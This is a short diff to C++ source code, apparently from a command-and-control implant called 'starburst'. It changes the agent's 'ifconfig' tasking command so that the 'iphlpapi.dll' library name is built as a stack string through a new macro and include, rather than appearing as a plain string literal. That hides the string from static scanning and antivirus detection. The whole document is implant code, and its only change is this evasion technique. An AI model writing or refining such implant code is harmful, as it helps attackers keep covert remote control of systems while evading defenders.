@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <stackstr.h>
 
 #ifdef INCLUDE_CMD_IFCONFIG
 
@@ -45,8 +46,8 @@ auto declfn starburst::cmd_ifconfig(
     _In_    char*     task_uuid,
     _In_    Parser*   params
 ) -> void {
-    auto h_iphlpapi = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA(
-        symbol<LPCSTR>( "iphlpapi.dll" ) ) );
+    STK_IPHLPAPI(_n);
+    auto h_iphlpapi = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA( _n ) );
     if ( !h_iphlpapi ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "LoadLibrary iphlpapi failed" ) ) );
